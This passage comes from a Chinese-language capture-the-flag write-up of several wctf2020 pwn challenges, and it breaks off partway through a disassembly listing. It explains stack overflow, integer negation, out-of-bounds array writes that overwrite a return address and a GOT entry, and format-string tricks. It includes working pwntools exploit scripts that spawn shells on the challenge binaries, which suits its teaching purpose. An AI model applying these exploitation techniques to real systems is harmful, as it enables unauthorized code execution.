alt="Gnd7PU.png"></p><p>很显然<code>/bbbbbbbbin_what_the_f?ck__--??/sh</code>不是一个正常路径，像之前那样设置返回地址到这个函数直接去执行肯定会失败，此时就需要知道环境变量中的<code>PATH</code>是什么东西，以及sh这个shell程序是怎么被<code>system</code>找到然后调用的(自行百度吧…这里不解释了)</p><p>知道了PATH之后<br>因为我们程序中函数调用字符串的时候，都是通过字符串指针调用的</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndjq1.png" alt="Gndjq1.png"></p><p>我们直接使用该字符串中<code>sh</code>地址(0x08048670)的作为参数然后将返回地址直接设置成<code>call system</code>的地址(0x08048529)即可</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;getshell-2&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br><span class="hljs-comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span><br><br>Host =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>Port =<span class="hljs-number">2334</span><br>p = remote(Host,Port)<br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&quot;\\ \n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0x08048529</span>)+p32(<span class="hljs-number">0x08048670</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="number-game-16-solves"><a href="#number-game-16-solves" class="headerlink" title="number_game - 16 solves"></a>number_game - 16 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Opc0de_neg_Is_StraNge&#125;</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwtoV.png" alt="GnwtoV.png"></p><p>ps：这里v2是canary，前面两个程序都没有开启这个保护所以看不到</p><p>这里的意思大致就是输入一个int整数，两次判断<code>v1</code>是否小于零，都满足的话就给出一个shell，但是中间做了一次<code>v1=-v1</code>的操作</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwYd0.png" alt="GnwYd0.png"></p><p>这个操作是通过neg指令实现的，这里这个指令的操作是将eax按位求反然后+1，如果我们想要被操作之后的eax最高位仍未1（保持这个数为负），之前eax就只能是<code>1000000...0</code>，即最高位为1然后其余位全为0，这个数在4字节的表述下就是这样的</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwDy9.png" alt="GnwDy9.png"></p><p>用<code>scanf</code>输入这个数就可以满足了</p><h2 id="Closed-10-solves"><a href="#Closed-10-solves" class="headerlink" title="Closed - 10 solves"></a>Closed - 10 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;A_pr@ctical_Trick&#125;</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwrLR.png" alt="GnwrLR.png"></p><p>这个题的目的就是想让你们学习一下什么是文件描述符还有输出重定位的知识（具体就自行百度吧）</p><p>这个程序虽然给出了shell，但是在之前关闭了进程标准输出<code>1</code>和标准错误输出<code>2</code>，所以getshell后自然也无法输出内容</p><p>这里介绍一个小trick：将标准输出重定位到标准输入<code>0</code>，也可以实现回显，具体见<a href="https://unix.stackexchange.com/questions/177228/behaviour-of-10-in-bash">这里</a></p><p>运行程序之后<code>sh 1&gt;&amp;0</code>即可实现回显</p><h2 id="NameYourCat-4-solves"><a href="#NameYourCat-4-solves" class="headerlink" title="NameYourCat - 4 solves"></a>NameYourCat - 4 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Cats_Are_Cute_right?&#125;</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/Gnwye1.png" alt="Gnwye1.png"></p><p>开启了canary还有栈不可执行，没有PIE</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnw6dx.png" alt="Gnw6dx.png"></p><p>main函数的意思就是5次循环，然后每次都执行一次NameWhich，这个函数的参数是v3</p><p>ps：因为IDA经常把函数的参数识别出问题，所以一定要点进具体的函数去看或者什么的</p><p>NameWhich是这样的</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwUiT.png" alt="GnwUiT.png"></p><p>在a1上按y将类型改成<code>char *</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwdWF.png" alt="GnwdWF.png"></p><p>此时再来缕程序的意思，main’中v3是一个char [40]的数组，然后每次我们在NameWhich中输入的下标后寻址都是<code>a1[8*v2]</code>，所以这个时候大致就知道了原本程序应该是写了一个二维数组<code>[5][8]</code></p><p>但是程序没有对我们输入的下标做检查，存在一个数组越界写，此时由于程序自带后门，数组在栈上，所以我们有一次将返回地址写成后门地址即可，具体下标经过简单计算即可得到：<code>(0x34+4)/8=7</code>（对计算下标不熟悉的一定要自己去算一算）</p><p>ps：这里还提个醒，这种输入的地方一定要注意有没有<code>\x0A</code>，就是换行符，如果输入字符串中碰到这个，scanf就直接截断了</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;NameYourCat&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br><span class="hljs-comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span><br><br>Host =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>Port =<span class="hljs-number">2337</span><br>p = remote(Host,Port)<br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">namefor</span>(<span class="hljs-params">idx,name</span>):<br>p.recvuntil(<span class="hljs-string">&quot;which?\n&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&#x27;name plz: &#x27;</span>)<br>p.sendline(name)<br><br>namefor(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>namefor(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;B&#x27;</span>)<br>namefor(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;C&#x27;</span>)<br>namefor(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;D&#x27;</span>)<br>namefor(<span class="hljs-number">7</span>,p32(<span class="hljs-number">0x080485CB</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="NameYourDog-5-solves"><a href="#NameYourDog-5-solves" class="headerlink" title="NameYourDog - 5 solves"></a>NameYourDog - 5 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Woof_wOOf_wooF&#125;</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwBQJ.png" alt="GnwBQJ.png"></p><p>程序基本上和NameYourCat一模一样</p><p>唯一不同之处在于<code>Dogs</code>此时不在栈上了，而是在bss段上</p><p>此时的数组越界就变成了下标为负数时利用，从而可以任意修改程序地址空间的内容，由于程序没有开启<code>FULL Relo</code>我这里最简单的方法就是修改GOT表（不知道GOT表是啥的小伙伴也请自行百度学习233333）</p><p>我采用的方法是将<code>scanf</code>的GOT表项修改为后门函数地址，从而在后续执行到scanf的时候就直接getshell了</p><p>此时的下标计算：<code>(0x0804A028-0804A060)/8=-7</code></p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;NameYourDog&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br><span class="hljs-comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span><br><br>Host =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>Port =<span class="hljs-number">2338</span><br>p = remote(Host,Port)<br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">namefor</span>(<span class="hljs-params">idx,name</span>):<br>p.recvuntil(<span class="hljs-string">&quot;which?\n&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&#x27;name plz: &#x27;</span>)<br>p.sendline(name)<br><br>namefor(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>namefor(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;B&#x27;</span>)<br>namefor(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;C&#x27;</span>)<br>namefor(-<span class="hljs-number">7</span>,p32(<span class="hljs-number">0x080485CB</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyfmt-2-solves"><a href="#babyfmt-2-solves" class="headerlink" title="babyfmt - 2 solves"></a>babyfmt - 2 solves</h2><blockquote><p>Author: ru7n</p></blockquote><p>本题就是把一些点糅合再了一起，没啥新意，:P</p><p>程序一开始是个询问时间的函数<strong>ask_time</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">ask_time</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;dididada.....&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tell me the time:&quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v1);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ok! time is %ld:%ld:%ld\n&quot;</span>, v1, v2, v3);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>要求我们输入数字，然后在打印出来</p><p>这里的一个知识点是，如果输入和<code>scanf</code>函数需求的格式不一致，那么是不会改变变量的值的，意思就是<strong>scanf</strong>本来要求我们要输入数字(%ld)，但我们输入’a’啊，’b’啊什么的，反正不是数字就行，这样<code>v1,v2,v3</code>的值就不会改变，到了<code>printf(&quot;ok! time is %ld:%ld:%ld\n&quot;, v1, v2, v3);</code>这句的时候就会把栈里的内容打印出来，泄露出地址，本题是泄露了程序的基地址</p><p>然后就到了菜单题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. leak&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. fmt_attack&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. get_flag&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. exit&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>leak</strong>函数给了一次任意读一字节的机会：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">leak</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( *a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No way!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  *a1 = <span class="hljs-number">1</span>;<br>  read_n(&amp;buf, <span class="hljs-number">8LL</span>);<br>  write(<span class="hljs-number">1</span>, buf, <span class="hljs-number">1uLL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>fmt_attack</strong>函数给了一次格式化字符串攻击的机会：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">fmt_attack</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> format; <span class="hljs-comment">// [rsp+10h] [rbp-40h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;format, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-keyword">if</span> ( *a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No way!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  *a1 = <span class="hljs-number">1</span>;<br>  read_n(&amp;format, <span class="hljs-number">0x28</span>LL);<br>  <span class="hljs-built_in">printf</span>(&amp;format, <span class="hljs-number">0x28</span>LL);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是<strong>get_flag</strong>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">get_flag</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// ST0C_4</span><br>  <span class="hljs-type">char</span> s2; <span class="hljs-comment">// [rsp+10h] [rbp-60h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;s2, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you can open the door!&quot;</span>);<br>  read_n(&amp;s2, <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(secret, &amp;s2, <span class="hljs-number">0x40</span>uLL) )<br>  &#123;<br>    close(<span class="hljs-number">1</span>);<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;s2, <span class="hljs-number">0x50</span>uLL);<br>    <span class="hljs-built_in">printf</span>(&amp;s2, &amp;s2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No way!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显，如果我们要拿到<strong>flag</strong>，就必须绕过<code>strncmp(secret, &amp;s2, 0x40uLL)</code>，绕过了这个之后，由于<code>close(1)</code>把输出流关了，所以我们还得想办法让<code>flag</code>能打印出来</p><p>首先是绕过<code>strncmp</code>，这个简单，只要把<code>secret</code>的首字节变为<code>\x00</code>就好，这样我们只要输入<code>\x00</code>就能绕过这个检查，原理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// strncmp源码</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">STRNCMP</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2, <span class="hljs-type">size_t</span> n)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>  <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">4</span>)<br>    &#123;<br>      <span class="hljs-type">size_t</span> n4 = n &gt;&gt; <span class="hljs-number">2</span>;<br>      <span class="hljs-keyword">do</span><br>&#123;<br>  c1 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s1++;<br>  c2 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s2++;<br>  <span class="hljs-keyword">if</span> (c1 == <span class="hljs-string">&#x27;\0&#x27;</span> || c1 != c2)<br>    <span class="hljs-keyword">return</span> c1 - c2;<br>         ...........................................<br></code></pre></td></tr></table></figure><p>绕过了这个<code>strncmp</code>后，就要看看怎么把<code>flag</code>打印出来了</p><p>我们可以看到在程序的<code>.bss</code>段里存放在<code>stdin,stdout,stderr</code>的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">0000000000202020</span> _bss            segment para public <span class="hljs-string">&#x27;BSS&#x27;</span> use64<br>.bss:<span class="hljs-number">0000000000202020</span>                 assume cs:_bss<br>.bss:<span class="hljs-number">0000000000202020</span>                 ;org <span class="hljs-number">202020</span>h<br>.bss:<span class="hljs-number">0000000000202020</span>                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing<br>.bss:<span class="hljs-number">0000000000202020</span>                 public <span class="hljs-built_in">stdout</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">0000000000202020</span> ; FILE *<span class="hljs-built_in">stdout</span><br>.bss:<span class="hljs-number">0000000000202020</span> <span class="hljs-built_in">stdout</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:<span class="hljs-number">00000000000004B</span>8↑o<br>.bss:<span class="hljs-number">0000000000202020</span>                                         ; initial+<span class="hljs-number">35</span>↑r<br>.bss:<span class="hljs-number">0000000000202020</span>                                         ; Alternative name is <span class="hljs-string">&#x27;stdout&#x27;</span><br>.bss:<span class="hljs-number">0000000000202020</span>                                         ; Copy of shared data<br>.bss:<span class="hljs-number">0000000000202028</span>                 align <span class="hljs-number">10</span>h<br>.bss:<span class="hljs-number">0000000000202030</span>                 public <span class="hljs-built_in">stdin</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">0000000000202030</span> ; FILE *<span class="hljs-built_in">stdin</span><br>.bss:<span class="hljs-number">0000000000202030</span> <span class="hljs-built_in">stdin</span>@@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:<span class="hljs-number">0000000000000500</span>↑o<br>.bss:<span class="hljs-number">0000000000202030</span>                                         ; initial+<span class="hljs-number">17</span>↑r<br>.bss:<span class="hljs-number">0000000000202030</span>                                         ; Alternative name is <span class="hljs-string">&#x27;stdin&#x27;</span><br>.bss:<span class="hljs-number">0000000000202030</span>                                         ; Copy of shared data<br>.bss:<span class="hljs-number">0000000000202038</span>                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">0000000000202040</span>                 public <span class="hljs-built_in">stderr</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">0000000000202040</span> ; FILE *<span class="hljs-built_in">stderr</span><br>.bss:<span class="hljs-number">0000000000202040</span> <span class="hljs-built_in">stderr</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:<span class="hljs-number">0000000000000530</span><br></code></pre></td></tr></table></figure><p>动态调试的时候跟进<code>printf</code>函数，会发现<code>printf</code>会取这里的指针：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> ► <span class="hljs-number">0x7f8f4b0c488a</span> &lt;printf+<span class="hljs-number">138</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x36e6bf</span>]<br>   <span class="hljs-number">0x7f8f4b0c4891</span> &lt;printf+<span class="hljs-number">145</span>&gt;    <span class="hljs-keyword">mov</span>    <span 